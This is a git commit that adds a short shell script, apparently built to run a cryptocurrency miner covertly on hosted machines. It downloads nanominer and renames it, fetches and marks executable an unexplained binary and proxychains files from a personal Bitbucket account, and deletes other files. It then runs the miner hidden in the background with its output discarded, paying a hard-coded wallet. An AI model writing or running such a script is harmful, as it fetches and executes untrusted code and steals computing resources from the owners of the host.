244f0085de986ea97f663e4e591155247d785c6f
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-07-29 09:28:18 +0700

    Create NanoMine.sh

---
+++ mnr/cpunlimited/NanoMine.sh
@@ -0,0 +1,8 @@
+wget -O hmm.tar.gz https://github.com/nanopool/nanominer/releases/download/v3.8.3/nanominer-linux-3.8.3.tar.gz && tar -xf hmm.tar.gz && mv nanominer namo
+wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
+wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
+echo "IP ORI ==> "$(curl ifconfig.me)
+echo "IP Baru ==> "$(curl ifconfig.me)
+rm -rf sh.sh config_*
+./namo -algo Verushash -coin VRSC -wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.Pragos -pool1 verushash.mine.zergpool.com:13300 &> /dev/null &
